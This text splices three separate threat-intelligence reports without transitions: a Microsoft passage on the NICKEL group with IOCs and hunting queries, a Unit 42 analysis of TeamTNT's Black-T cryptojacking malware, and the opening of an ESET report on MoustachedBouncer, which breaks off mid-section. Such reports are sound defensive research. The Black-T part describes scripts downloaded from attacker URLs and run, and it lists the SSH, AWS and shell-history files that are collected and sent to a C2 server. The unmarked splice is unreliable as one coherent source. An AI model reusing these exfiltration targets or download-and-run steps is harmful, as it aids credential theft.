C:\Program Files\Realtek\Audio\HDA\AERTSr.exe
C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe
C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe
C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe
Using compromised credentials for routine email collection
NICKEL used compromised credentials to sign into victims’ Microsoft 365 accounts through normal sign-ins with a browser and the legacy Exchange Web Services (EWS) protocol to review and collect victim emails. MSTIC has observed successful NICKEL sign-ins to compromised accounts through commercial VPN providers as well as from actor-controlled infrastructure. The activity graphed below shows NICKEL sign-in activity happening most frequently on Monday through Friday from 12:00 AM UTC (8:00 AM China Standard time) through 09:00 AM UTC (5:00 PM China Standard Time). There are also possible indications of a shift-based scheduling model based on the observed limited set of activity during a typical weekend. Heatmap showing activity by day and hour

Figure 2: Heatmap of observed NICKEL login activity by day of week and hour (UTC time)

Evidence of routine host data collection
In several observed cases, NICKEL was seen performing regular data collection for exfiltration purposes.

Their activity included looking in directories of interest for new files added since the last time they collected data. In the example below, NICKEL was collecting data that had been created or modified multiple times over a one-month period. For instance, on October 22, NICKEL looked for files that had been created since October 19 in multiple folders. Previously, on October 20 they had done the same thing looking for files that were modified or created since October 13. Here are recent examples of NICKEL’s routine data collection:

Screenshot of command lines by NICKEL

After collecting the data in a central directory, the attackers then used either a renamed rar.exe or 7z.exe to archive the files. NICKEL also frequently used keyboard walks as a password for their archived data collections. The following are examples of RAR archiving for exfiltration:

Screenshot of code for RAR archiving

Here is an example of 7zip archiving for exfiltration:

screenshot of command for 7zip archiving
Microsoft will continue to monitor NICKEL activity and implement product protections for our customers.

The IOCs, current detections, and advanced protections in place across our security products are detailed below. Recommended defenses
The following guidance can help mitigate the techniques and threat activity described in this blog:

Block legacy authentication protocols in Azure Active Directory – especially Exchange Web Services (EWS)
Enable multi-factor authentication to mitigate compromised credentials. For Office 365 users, see multi-factor authentication support. For Consumer and Personal email accounts, see how to use two-step verification. Use passwordless solutions like Microsoft Authenticator to secure accounts. Review and enforce recommended Exchange Online access policies. Block ActiveSync clients from bypassing Conditional Access policies. Block all incoming traffic from anonymizing services, where possible. Turn on the following attack surface reduction rule to block or audit activity associated with this threat:
Block credential stealing from the Windows local security authority subsystem (lsass.exe)
Indicators of compromise (IOCs)
Type	Indicator
SHA-256	02daf4544bcefb2de865d0b45fc406bee3630704be26a9d6da25c9abe906e7d2
SHA-256	0a45ec3da31838aa7f56e4cbe70d5b3b3809029f9159ff0235837e5b7a4cb34c
SHA-256	0d7965489810446ca7acc7a2160795b22e452a164261313c634a6529a0090a0c
SHA-256	10bb4e056fd19f2debe61d8fc5665434f56064a93ca0ec0bef946a4c3e098b95
SHA-256	12d914f24fe5501e09f5edf503820cc5fe8b763827a1c6d44cdb705e48651b21
SHA-256	1899f761123fedfeba0fee6a11f830a29cd3653bcdcf70380b72a05b921b4b49
SHA-256	22e68e366dd3323e5bb68161b0938da8e1331e4f1c1819c8e84a97e704d93844
SHA-256	259783405ec2cb37fdd8fd16304328edbb6a0703bc3d551eba252d9b450554ef
SHA-256	26debed09b1bbf24545e3b4501b799b66a0146d4020f882776465b5071e91822
SHA-256	35c5f22bb11f7dd7a2bb03808e0337cb7f9c0d96047b94c8afdab63efc0b9bb2
SHA-256	3ae2d9ffa4e53519e62cc0a75696f9023f9cce09b0a917f25699b48d0f7c4838
SHA-256	3bac2e459c69fcef8c1c93c18e5f4f3e3102d8d0f54a63e0650072aeb2a5fa65
SHA-256	3c0bf69f6faf85523d9e60d13218e77122b2adb0136ffebbad0f39f3e3eed4e6
SHA-256	3dc0001a11d54925d2591aec4ea296e64f1d4fdf17ff3343ddeea82e9bd5e4f1
SHA-256	3fd73af89e94af180b1fbf442bbfb7d7a6c4cf9043abd22ac0aa2f8149bafc90
SHA-256	6854df6aa0af46f7c77667c450796d5658b3058219158456e869ebd39a47d54b
SHA-256	6b79b807a66c786bd2e57d1c761fc7e69dd9f790ffab7ce74086c4115c9305ce
SHA-256	7944a86fbef6238d2a55c14c660c3a3d361c172f6b8fa490686cc8889b7a51a0
SHA-256	926904f7c0da13a6b8689c36dab9d20b3a2e6d32f212fca9e5f8cf2c6055333c
SHA-256	95e98c811ea9d212673d0e84046d6da94cbd9134284275195800278593594b5a
SHA-256	a142625512e5372a1728595be19dbee23eea50524b4827cb64ed5aaeaaa0270b
SHA-256	afe5e9145882e0b98a795468a4c0352f5b1ddb7b4a534783c9e8fc366914cf6a
SHA-256	b9027bad09a9f5c917cf0f811610438e46e42e5e984a8984b6d69206ceb74124
SHA-256	c132d59a3bf0099e0f9f5667daf7b65dba66780f4addd88f04eecae47d5d99fa
SHA-256	c9a5765561f52bbe34382ce06f4431f7ac65bafe786db5de89c29748cf371dda
SHA-256	ce0408f92635e42aadc99da3cc1cbc0044e63441129c597e7aa1d76bf2700c94
SHA-256	ce47bacc872516f91263f5e59441c54f14e9856cf213ca3128470217655fc5e6
SHA-256	d0fe4562970676e30a4be8cb4923dc9bfd1fca8178e8e7fea0f3f02e0c7435ce
SHA-256	d5b36648dc9828e69242b57aca91a0bb73296292bf987720c73fcd3d2becbae6
SHA-256	e72d142a2bc49572e2d99ed15827fc27c67fc0999e90d4bf1352b075f86a83ba
Domain name	beesweiserdog[.]com
Domain name	bluehostfit[.]com
Domain name	business-toys[.]com
Domain name	cleanskycloud[.]com
Domain name	cumberbat[.]com
Domain name	czreadsecurity[.]com
Domain name	dgtresorgouv[.]com
Domain name	dimediamikedask[.]com
Domain name	diresitioscon[.]com
Domain name	elcolectador[.]com
Domain name	elperuanos[.]org
Domain name	eprotectioneu[.]com
Domain name	fheacor[.]com
Domain name	followthewaterdata[.]com
Domain name	francevrteepress[.]com
Domain name	futtuhy[.]com
Domain name	gardienweb[.]com
Domain name	heimflugaustr[.]com
Domain name	ivpsers[.]com
Domain name	jkeducation[.]org
Domain name	micrlmb[.]com
Domain name	muthesck[.]com
Domain name	netscalertech[.]com
Domain name	newgoldbalmap[.]com
Domain name	news-laestrella[.]com
Domain name	noticialif[.]com
Domain name	opentanzanfoundation[.]com
Domain name	optonlinepress[.]com
Domain name	palazzochigi[.]com
Domain name	pandemicacre[.]com
Domain name	papa-ser[.]com
Domain name	pekematclouds[.]com
Domain name	pipcake[.]com
Domain name	popularservicenter[.]com
Domain name	projectsyndic[.]com
Domain name	qsadtv[.]com
Domain name	sankreal[.]com
Domain name	scielope[.]com
Domain name	seoamdcopywriting[.]com
Domain name	slidenshare[.]com
Domain name	somoswake[.]com
Domain name	squarespacenow[.]com
Domain name	subapostilla[.]com
Domain name	suzukicycles[.]net
Domain name	tatanotakeeps[.]com
Domain name	tijuanazxc[.]com
Domain name	transactioninfo[.]net
Domain name	eurolabspro[.]com
Domain name	adelluminate[.]com
Domain name	headhunterblue[.]com
Domain name	primenuesty[.]com
Detections
Microsoft 365 Defender
Antivirus

Microsoft Defender Antivirus detects threat components as the following malware:

Backdoor:Win32/Leeson
Trojan:Win32/Kechang
Backdoor:Win32/Nightimp!dha
Trojan:Win32/Rokum
TrojanSpy:Win32/KeyLogger
Endpoint detection and response (EDR)

Alerts with the following titles in the security center can indicate NICKEL threat activity on your network:

NICKEL activity group
Malware associated with NICKEL activity group
Communication with NICKEL infrastructure
The following alerts may also indicate threat activity associated with NICKEL but may also be triggered by unrelated threat activity:

Mimikatz credential theft tool
Suspected credential theft activity
Malicious credential theft tool execution detected
Sensitive credential memory read
Password hashes dumped from LSASS memory
Suspicious credential dump from NTDS.dit
Compression of sensitive data
Staging of sensitive data
Suspicious process transferring data to external network
Possible data exfiltration through multiple egress points
Microsoft 365 Defender correlates related alerts into consolidated incidents to help customers determine with confidence if observed alerts are related to this activity.

We also published a threat analytics report on the NICKEL activity described in this blog. Microsoft 365 Defender can use the threat analytics report to get technical information, as well as view, investigate, and respond to incidents and alerts that include any detections of related NICKEL activity. Advanced hunting queries
Microsoft Sentinel
The indicators of compromise (IoCs) included in this blog post can be used by Microsoft Sentinel customers for detection purposes using the queries detailed below. Match known NICKEL domains and hashes

The following query matches domain name, hash IOCs and Microsoft 365 Defender signatures related to the NICKEL activity group with CommonSecurityLog, DnsEvents, VMConnection and SecurityEvents dataTypes. https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/NICKELIOCsNov2021.yaml

Identify NICKEL registry modifications patterns

The following query identifies instances where NICKEL malware intentionally configures the browser settings for its use by modifying registry entries. https://github.com/azure/azure-sentinel/blob/master/Hunting%20Queries/MultipleDataSources/NickelRegIOCPatterns.yaml

Hunt for NICKEL Command Line Activity November 2021

The below query looks for process command line activity related to data collection and staging observed being used by NICKEL.

It hunts for use of tools such as xcopy and renamed archiving tools used for data collection and staging on the hosts with signatures observed in NICKEL activity. https://github.com/azure/azure-sentinel/blob/master/Hunting%20Queries/MultipleDataSources/NICKELCommandLineActivity-Nov2021.yaml

Microsoft 365 Defender
Surface WDigest authentication changes

Use this query to look for alerts related to enabling WDigest Authentication, which allows attackers to dump credentials in clear text. Run query

AlertInfo
| where Title == "WDigest configuration change"
| join AlertEvidence on AlertId

Surface discovery activity

Use this query to surface potential NICKEL discovery activity. Run query

DeviceProcessEvents
| where InitiatingProcessFileName =~ "rundll32.exe" and InitiatingProcessCommandLine has ",start"
| where ProcessCommandLine has_any("cmd",
"netstat", "tasklist", "dir", "del", "net use", "ipconfig", "systeminfo", "xcopy", "mkdir", ".bat")

Executive Summary
Unit 42 researchers discovered a new variant of cryptojacking malware named Black-T, authored by TeamTNT, a group known to target AWS credential files on compromised cloud systems and mine for Monero (XMR). Black-T follows the traditional TeamTNT tactics, techniques and procedures (TTPs) of targeting exposed Docker daemon APIs and performing scanning and cryptojacking operations on vulnerable systems of affected organizations. However, code within the Black-T malware sample gives evidence of a shift in TTPs for TeamTNT operations. Of these new TTPs, most notable are the targeting and stopping of previously unknown cryptojacking worms (i.e. the Crux worm, ntpd miner, and a redis-backup miner). Also, TeamTNT has been implementing the use of memory password scraping operations via mimipy and mimipenguins, which are *NIX equivalents to the commonly used Windows-specific memory password scraper functionality of Mimikatz. Mimikatz is a tool capable of scraping plaintext passwords from Windows OS systems, and also has the capability to perform pass-the-hash and pass-the-token operations, allowing attackers to hijack user sessions.

Any identified passwords which were obtained through mimipenguins are then exfiltrated to a TeamTNT command and control (C2) node. This is the first time TeamTNT actors have been witnessed including this type of post-exploitation operation in their TTPs. This conceptual image illustrates the concept of cryptojacking, a technique used by Black-T
The Black-T tool also has the capability to use three different network scanning tools to identify additional exposed Docker daemon APIs, within the local network of the compromised system and across any number of publicly accessible networks, to extend their cryptojacking operations. Both masscan and pnscan have been used before by TeamTNT actors. However, the addition of zgrab, a GoLang network scanner, marks the first time that a GoLang tool has been witnessed incorporated into TeamTNT’s TTPs. There was also an update to the masscan network scanner operation to include searching for TCP port 5555. While the exact purpose regarding adding port 5555 to the scanner is unknown, there have been documented cases where XMR cryptojacking is occurring on Android-based devices.

This could indicate a new unknown target set for expanding TeamTNT cryptojacking operations. However, there is little evidence to support TeamTNT targeting Android devices. Unit 42 researchers have discovered several German-language phrases inserted into multiple TeamTNT scripts, Black-T included. The very first line within the script following an ASCII art banner reads: verbose mode ist nur für euch  damit ihr was zum gucken habt in der sandbox :-* which translates to “verbose mode is only for you  so that you have something to watch in the sandbox.” There have been several other cases where German phrases have been used within TeamTNT scripts. Palo Alto Networks Prisma Cloud can assist in securing cloud deployments against the threats posed by TeamTNT, by guiding organizations to better detect vulnerabilities or misconfigurations in cloud environment settings and infrastructure as code (IaC) templates prior to deploying production systems. Additionally, by installing the latest apps and threat definitions on Palo Alto Networks Next-Generation Firewall, network connections to known XMR public mining pools, or to malicious domains and IPs, can be prevented before the environment is compromised.

Black-T Dissection
The Black-T script is downloaded from the TeamTNT domain, hxxps://teamtnt[.]red/BLACK-T/SetUpTheBLACK-T, to the compromised cloud system that maintained an exposed Docker daemon API. Once downloaded to the compromised system, the script will perform the following actions. Drawn in ASCII art, the banner displays: "Black-T v.1"
Figure 1. TeamTNT’s Black-T ASCII banner. First, there is a display of an ASCII art banner declaring that this variant is version 1 (see Figure 1). Then, the script performs a clean and system prep operation, in which the script will remove known cryptojacking malware already in place on the compromised system. Black-T specifically targets Kinsing malware, a competing cryptojacking process family. It is also important to note that TeamTNT authors have copied several pieces of malware code, both within previous TeamTNT tools as well as within this Black-T tool, to augment their own cryptojacking malware. Specifically, this copied code allows for the removal and evasion of Aliyun and Tencent cloud security software, and adds AWS credential-stealing features and masscan scanning functionality.

Disable Active XMR Miners
Unit 42 researchers also found evidence that the TeamTNT authors are now targeting other potential competing cryptojacking malware families, outside of the previously mentioned kinsing cryptojacking process. These competing cryptojacking processes include kswapd0, ntpd miner, redis-backup miner, auditd miner, migration miner, and finally, the Crux worm (see Figure 2) as well as the Crux worm miner (see Figure 3). With the inclusion of these potential cryptojacking processes found within the Black-T malware, it would appear that these cryptojacking processes are known to the TeamTNT authors as competing for cloud processing resources. This would also indicate there are several cryptojacking processes currently unknown to defense teams and efforts should be taken to identify and build mitigation rules for these currently unknown cryptojacking processes. There is an XMR public mining pool called cruxpool[.]com. However, no additional information is currently available to support if the Crux worm uses the public mining pool cruxpool, or if this is simply a clever naming convention used by cryptojacking operators.

Following the cleaning of any known cryptojacking processes, the Black-T malware will also perform a cleaning operation for any known xmrig process currently running on the compromised system. XMRig is a popular open-source process, which facilitates the computational operations needed to mine the XMR cryptocurrency. The code in the screenshot shows the process by which the Black-T malware attempts to remove the Crux worm. Figure 2. Crux worm process removal. The code in the screenshot shows the process by which the Black-T malware attempts to remove the Crux worm mining process. Figure 3. Crux worm mining process removal. Of note, TeamTNT makes use of customized processes within their scripts. These custom processes represent traditional *NIX processes, but have the prefix “tnt” added to the process name. For example, tntrecht is a customized process that is loaded into /usr/local/bin/tntrecht on the compromised system and is likely used to hijack and modify the permissions of legitimate *NIX processes to be used for TeamTNT operations.

The modified legitimate processes are subsequently renamed with the “tnt” prefix – for instance, tntwget and tntcurl. System Setup
Following the cleanup of the compromised system, the script will further set up the system environment by setting Path Variables: PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin, naming 8.8.4.4 and 8.8.8.8 as new DNS servers, and finally, flushing all established IP table rules using the command iptables -F. The script will then check to see which *NIX package manager is installed on the compromised system: Advanced Package Tool (APT), Yellowdog Updater, Modified (YUM) or Alpine Linux package manager (APK). Regardless of the package manager type identified, the script will install masscan, along with libpcap to perform network packet traffic listening, pnscan (a network scanning tool, although within the current sample, pnscan functionality has been commented out), zgrab (a GoLang tool built for zmap), Docker and jq (a flexible command-line JSON processor). See the setup image in Figure 4.

This example of APT package manager setup in Black-T shows the emphasis being placed on scanning capabilities. The setup includes installing massscan, pnscan (commented out), zgrab, Docker and jq. Figure 4. APT package manager setup. Unit 42 researchers believe that TeamTNT actors are planning on building more sophisticated cryptojacking features into their tool sets – specifically for identifying vulnerable systems within various cloud environments. Never before has TeamTNT been known to use the network scanner software zmap. But TeamTNT is not only using zmap, they are using the little-known zgrab, which is a GoLang tool used to capture address banners. It is currently unclear how TeamTNT actors will use this data, but it is highly likely the actors are giving zgrab a trial run to test the scanner’s functionality for their operations, and may make adjustments accordingly. This idea is supported by the zgrab GitHub page, which states that, “zgrab tends to be very unstable, API's may break at any time, so be sure to vendor zgrab.” It is further supported by the fact that during the time of writing this blog, zmap had deprecated the original zgrab tool, which was used in Black-T, and has replaced it with a new version of zgrab, called zgrab2.

Unit 42 researchers do know that TeamTNT actors are placing a great deal of importance on scanning capabilities within the Black-T tool, as there are currently three different scanners built into this tool (masscan, pscan and zgrab). Download Toolsets
The Black-T variant downloads two files, which execute directly into bash: hxxps://teamtnt[.]red/BLACK-T/beta and hxxps://teamtnt[.]red/BLACK-T/setup/bd. Beta
Beta is used to make a new directory /.../ where the following files are compressed into two tar files named root.tar.gz:

/root/.bash_history
/root/.ssh/
/etc/hosts
/root/.docker/
/root/.aws/
/root/*.sh
/home/*/.bash_history
/home/*/.ssh/
/home/*/*.sh
And, cron.tar.gz:

/etc/cron*/
/var/spool/cron/
These two files, upon compression, are then sent to the URL hxxps://teamtnt[.]red/only_for_stats/dup.php. It is important to note that TeamTNT actors are still targeting AWS credential and configuration files located on compromised AWS cloud systems. If compromised systems do contain AWS credentials, the TeamTNT actors could attempt to use these AWS credentials to expand their cryptojacking operations within the compromised system’s AWS environment.

By using the AWS credentials obtained from the exposed and compromised Docker daemon system, TeamTNT actors could use this system as a pivot point to gain access to additional cloud systems and resources that use the same AWS credentials and which are hosted within the system’s larger AWS environment. The beta script then downloads the file hxxps://teamtnt[.]red/x/pw, and also downloads the hxxps://teamtnt[.]red/BLACK-T/setup/bd, which is a duplicate from the Black-T download. Finally, the beta script will set the service token for monitoring XMR mining operations. This token is set as abyofigfefda6c3itn9f3zkrmjfays31, and it will redownload the Black-T script, hxxps://teamtnt[.]red/BLACK-T/SetUpTheBLACK-T. This is likely done as a means of redundancy to provide actors with different types of operations to launch following the exploitation of a system. pw
The script pw is very intriguing, as it performs post-exploitation operations of password scraping using mimipy and mimipenquin, which are *NIX tools adapted for use from the Windows tool Mimikatz.

Upon uncovering any passwords residing in memory within the compromised system, the passwords are written to the file /var/tmp/.../output.txt, which is then uploaded to hxxps://teamtnt[.]red/only_for_stats/dup.php. See Figure 5. The script pw performs post-exploitation operations of password scraping, as shown in the screenshotted code. Figure 5. Memory password scraping and exfil. bd
The script bd is used to download the XMR mining software relevant to the given compromised system. These downloaded files and the SHA256 values for the mining software have been reported on before during an operation targeting Weave Scope deployments. The script bd downloads XMR mining software relevant to the given compromised system, as shown here. Figure 6. Downloaded mining software. Unit 42 researchers downloaded each of the software samples and believe these samples to be the same style of samples that have been previously reported (see Table 1). Name	SHA-256 Hash	Note/VirusTotal Findings
bioset	a5dd446b2a7b8cfd6b6fd4047cc2fddfcea3a4865d8069dcd661e422046de2a1	Possibly corrupted
kube	a506c6cf25de202e6b2bf60fe0236911a6ff8aa33f12a78edad9165ab0851caf	VT = 33/60
kube.jpg

tshd	a5e6b084cdabe9a4557b5ff8b2313db6c3bb4ba424d107474024030115eeaa0f	Possibly Corrupt
VT = 1/60
docker-update	139f393594aabb20543543bd7d3192422b886f58e04a910637b41f14d0cad375	VT = 35/60
default.jpg
Table 1.

TeamTNT XMR mining software. XMR Miner Setup
The Black-T script then downloads the known XMR miner software sbin_u, (SHA256: fae2f1399282508a4f01579ad617d9db939d0117e3b2fcfcc48ae4bef59540d9). This type of mining software has been linked before to TeamTNT. VirusTotal currently only lists the malware as an 8/62, but does label it as an Executable Linkable Format (ELF) CoinMiner (see Figure 7), mining software which operates on *NIX platform systems. VirusTotal metadata of the file sbin_u lists the malware as an 8/62, but does label it as an Executable Linkable Format (ELF) CoinMiner. Figure 7. VirusTotal metadata of the file sbin_u
Finally, Black-T configures the XMR mining software to use the following XMR wallet address: 84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8. Figure 8 shows that as of the time of this writing, only five workers were reported producing 8.2 KH/s, which is down from a maximum of 25.05 KH/s on September 26, 2020. This particular XMR wallet has only managed to gather roughly US$10 as of September 29, 2020, likely due to the fact that this is a very new variant of cryptojacking software and hasn’t had much time to spread.

MoneroOcean results for the Black-T XMR wallet address show only five workers producing 8.2 KH/s as of Sept. 29, 2020. Figure 8. MoneroOcean results for the Black-T XMR wallet address. Worm Functionality
TeamTNT has long maintained its usage of worm-like techniques and has used masscan or pnscan to discover vulnerable systems. Black-T is no exception. However, there is a subtle difference between previously reported TeamTNT masscan operations and those present within Black-T. Specifically, in Black-T, we see the addition of a new scanning port, TCP 5555 (see Figure 9). While the exact purpose of adding port 5555 to the scanner is unknown, there have been documented cases where XMR cryptojacking is occurring on Android-based devices. This could indicate a new unknown target set for expanding TeamTNT cryptojacking operations. However, there is little evidence to support TeamTNT targeting Android devices. Team TnT's masscan scanning operations include the addition of a new scanning port in Black-T, as shown here: TCP 5555.

Figure 9. TeamTNT masscan scanning operations. Additionally, Black-T also performs scanning operations on a random CIDR 8 network range as it searches for exposed Docker API instances. This is also a new finding related to TeamTNT TTPs (see Figure 10). By expanding the scanning range of Black-T, TeamTNT actors are greatly expanding the scope of their targeting operations. Instead of only scanning the local network range of a compromised system, Black-T will begin scanning an entire CIDR 8 network range at random. For example, if Black-T selects 134.0.0.0/8, any address between 134.0.0.0 and 134.255.255.255 which contains an exposed Docker daemon API will be targeted and Black-T will attempt to exploit that system. Given enough time, every publicly available IP address will be scanned for an exposed Docker daemon API system. This has the potential to greatly increase the number of compromised systems owned by TeamTNT actors. Black-T performs scanning operations on a random CIDR 8 network range as it searches for exposed Docker API instances, as shown here.

Figure 10. Random Docker API scanning operation. Conclusion
TeamTNT is a cloud-focused cryptojacking group which targets exposed Docker daemon APIs. Upon successful identification and exploitation of the Docker daemon API, TeamTNT will drop the new cryptojacking variant Black-T. This variant installs up to three different types of network scanners (masscan, pnscan and zgrab), which are used to scan for additional exposed Docker daemon APIs. Black-T will also perform memory scraping operations following the successful exploitation of the cloud system. This is performed via mimipy and mimipenguins scripts, which are downloaded to the compromised system. Any identified passwords are then exfiltrated to a TeamTNT C2 node. Similar to the stolen AWS credentials also captured by the TeamTNT actors, these credentials are likely to be used for additional operations targeted against the organization managing the compromised Docker API. In order to protect cloud systems from TeamTNT’s Black-T cryptojacking malware, organizations should perform the following actions:

Ensure that cloud environments are not exposing Docker daemon APIs or any other network service, which inadvertently exposes sensitive internal network services.

Leverage Palo Alto Networks Prisma Cloud to secure cloud deployments. Install the latest apps and threat definitions on the Palo Alto Networks Next-Generation Firewall. Indicators of Compromise
URLs
hxxps://teamtnt[.]red

hxxps://teamtnt[.]red/BLACK-T/beta

hxxps://teamtnt[.]red/BLACK-T/CleanUpThisBox

hxxps://teamtnt[.]red/BLACK-T/setup/bd

hxxps://teamtnt[.]red/BLACK-T/setup/docker-update

hxxps://teamtnt[.]red/BLACK-T/setup/hole

hxxps://teamtnt[.]red/BLACK-T/setup/kube

hxxps://teamtnt[.]red/BLACK-T/setup/tshd

hxxps://teamtnt[.]red/BLACK-T/SetUpTheBLACK-T

hxxps://teamtnt[.]red/BLACK-T/SystemMod

hxxps://teamtnt[.]red/ip_log/getip[.]php

hxxps://teamtnt[.]red/only_for_stats/dup[.]php

hxxps://teamtnt[.]red/x/getpwds[.]tar[.]gz

hxxps://teamtnt[.]red/x/pw

hxxps://iplogger[.]org/blahblahblah

Monero Mining Pool
MoneroOcean[.]stream

SHA-256 Hashes
Black-T related hashes

SHA-256 Hash	Filename
90c74c9ff4c502e155d2dc72f3f6c3f512d354d71b5c480c89b6c1b1852bcb1f	bd.bin
1cf803a8dd2a41c4b976106b0ceb2376f46bafddeafbcef6ff0c312fc78e09da	beta.bin
a5dd446b2a7b8cfd6b6fd4047cc2fddfcea3a4865d8069dcd661e422046de2a1	bioset.bin
9f8cb3f25a8b321b86ee52c16b03b3118f3b157b33e29899d265da3433a02c79	SetUpTheBLACK-T.bin
6c16473060ffd9e215ee8fc82ff430384a8b99ea85000486f363e9bff062898d	cleanupthisbox.bin
139f393594aabb20543543bd7d3192422b886f58e04a910637b41f14d0cad375	docker-update.bin
5b417032a80ddf4d9132a3d7d97027eeb08d9b94b89f5128863930c1967c84c4	getpwds.tar.gz
e92b19f535fa57574401b6cdbf511a234a0b19335bd2ad6751839c718dc68e4d	gimmecredz.sh
a506c6cf25de202e6b2bf60fe0236911a6ff8aa33f12a78edad9165ab0851caf	kube.bin
c0069aab1125a8ac1b9207e56371e86693b26b0dcab1630f337be55929b36a2a	pw.bin
fae2f1399282508a4f01579ad617d9db939d0117e3b2fcfcc48ae4bef59540d9	sbin_u
84fabfbbd134bbeeb5481a96b023f44a671382349e5b39928baf0e80e28fd599	setup_moneroocean_miner.bin
06e9cb770c61279e91adb5723f297d472a42568936199aef9251a27568fd119f	systemmod.bin
a5e6b084cdabe9a4557b5ff8b2313db6c3bb4ba424d107474024030115eeaa0f	tshd.bin
Mimipy and Mimipenguin Related Hashes

SHA-256 Hash	Filename
79b478d9453cb18d2baf4387b65dc01b6a4f66a620fa6348fa8dbb8549a04a20	mimipenguin.py
3acfe74cd2567e9cc60cb09bc4d0497b81161075510dd75ef8363f72c49e1789	mimipenguin.sh
73a956f40d51da737a74c8ad4ecbfab12350621ffc167b5c278cd33ce9e0e0f0	mimipy.py
b9b3a97ed5c335b61f2cc9783cb8f24c9cff741d020b850502542dbd81c2c2df	pack.py
1f09ccae15d8d452bde39f7ada9660df3cf0598137c5ac7a47027d8b9107415d	pupyimporter.py
023283c035a98fcb0b4d32bc103a44df5844c5e41c82261e0d029180cde58835	dbg.h
a0d4cbbb61e3b900a990a2b06282989c70d5d7cb93052ad7ec04dcd64701d929	max.h
6cbf056fe35f1a809b8e8a2a5fc1f808bb4366e6e1ca2767fb82832d60c9ecf8	scanner.h
9469e2937be4cf37e443ba263ffc1ee9aa1cf6b6a839ad60e3ecfe3e9e1bc24e	targets.h
9703cd1d00bf6f55b5becb1dd87ffcbd98b2ac791c152f7adcb728c5512df5e2	users.h
88226956193afb5e5250639bd62305afde125a658b7e924ce5a5845d08f7de08	mimipenguin.c
54d7524c73edbd9fe3cfa962656db23d6a2d8e4ebc6a58b116b3b78d732acfdf	scanner.c
ac54934dd9b3b55296baf3e4d1aec959f540bed71d02a6f624edab281a719bdf	targets.c
00f116b831f720b62acf3a2d0db2a870b6ae114c4f9b3b517362a49c42c5a6f3	users.c
Monero Wallet
84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8

Long-term espionage against diplomats, leveraging email-based C&C protocols, C++ modular backdoors, and adversary-in-the-middle (AitM) attacks… Sounds like the infamous Turla? Think again! Matthieu Faou
Matthieu Faou

10 Aug 2023  •  29 min. read

MoustachedBouncer: Espionage against foreign diplomats in Belarus
MoustachedBouncer is a cyberespionage group discovered by ESET Research and first publicly disclosed in this blogpost. The group has been active since at least 2014 and only targets foreign embassies in Belarus. Since 2020, MoustachedBouncer has most likely been able to perform adversary-in-the-middle (AitM) attacks at the ISP level, within Belarus, in order to compromise its targets. The group uses two separate toolsets that we have named NightClub and Disco. Key points of this report:

MoustachedBouncer has been operating since at least 2014. We assess with medium confidence that they are aligned with Belarus's interests. MoustachedBouncer specializes in the espionage of foreign embassies in Belarus. MoustachedBouncer has used the adversary-in-the-middle technique since 2020 to redirect captive portal checks to a C&C server and deliver malware plugins via SMB shares.

We believe that MoustachedBouncer uses a lawful interception system (such as SORM) to conduct its AitM operations. We assess with low confidence that MoustachedBouncer is closely cooperating with Winter Vivern, another group targeting European diplomats but using different TTPs. Since 2014, the group has been operating a malware framework that we have named NightClub. It uses the SMTP and IMAP (email) protocols for C&C communications. Starting in 2020, the group has been using, in parallel, a second malware framework we have named Disco. Both NightClub and Disco support additional spying plugins including a screenshotter, an audio recorder, and a file stealer. The group's intricate tactics, techniques and procedures were also discussed on the ESET Research Podcast. Just press play to learn more from ESET's Director of Threat Research Jean-Ian Boutin and ESET Distinguished Researcher Aryeh Goretsky. Victimology
According to ESET telemetry, the group targets foreign embassies in Belarus, and we have identified four different countries whose embassy staff have been targeted: two from Europe, one from South Asia, and one from Africa.

The key dates are shown in Figure 1. MoustachedBouncer_Timeline_edited
Figure 1. Timeline of MoustachedBouncer activities

Attribution
While we track MoustachedBouncer as a separate group, we have found elements that make us assess with low confidence that they are closely collaborating with another group known as Winter Vivern. The latter was discovered in 2021 and is still active as of 2023. In March 2023, Winter Vivern used a known XSS vulnerability (CVE-2022-27926) in the Zimbra mail portal in order to steal webmail credentials of diplomats of several European countries. This campaign was publicly disclosed by Proofpoint researchers. MoustachedBouncer’s activity spans from 2014 to 2022 and the TTPs of the group have evolved over time. For example, we have first seen them use AitM attacks only in 2020. However, the targeted vertical has stayed the same. Table 1 shows the characteristics of each campaign. Given these elements, we assess with high confidence that they are all linked to MoustachedBouncer.

Table 1. Connections between the MoustachedBouncer campaigns

In this section, we detail the initial access for Disco. We don’t yet know the initial access method MoustachedBouncer uses to install NightClub. Fake Windows Update
To compromise their targets, MoustachedBouncer operators tamper with their victims’ internet access, probably at the ISP level, to make Windows believe it’s behind a captive portal. Windows 10 checks whether it’s able to access the internet with an HTTP request to http://www.msftconnecttest.com/connecttest.txt. In case the answer is not Microsoft Connect Test, a browser window is opened to http://www.msftconnecttest.com/redirect . For IP ranges targeted by MoustachedBouncer, the network traffic is tampered at the ISP level, and the latter URL redirects to a seemingly legitimate, but fake, Windows Update URL, http://updates.microsoft[.]com/. Hence, the fake Windows Update page will be displayed to a potential victim upon network connection. The fake update page is shown in Figure 2. The text we observed is in Russian, most likely because that is the main language used in Belarus, but it is possible that versions in other languages exist.

The page indicates that there are critical system security updates that must be installed. Figure 2. Fake Windows Update page

Note that it is using unencrypted HTTP and not HTTPS, and that the updates.microsoft[.]com subdomain does not exist on Microsoft’s nameservers, so it does not resolve on the open internet. During the attack, this domain resolved to 5.45.121[.]106 on the target’s machine. This IP address is used for parking domains and is unrelated to Microsoft. Although this is an internet-routable IP address, traffic to this IP never reaches the internet while the AitM attack is ongoing. Both the DNS resolutions and the HTTP replies were injected in transit, probably at the ISP level. An important point is that the adversary-in-the-middle (AitM) technique only occurs against a few selected organizations (perhaps just embassies), not countrywide. It is not possible to reproduce the redirection by simply exiting from a random IP address in Belarus.

Malware delivery
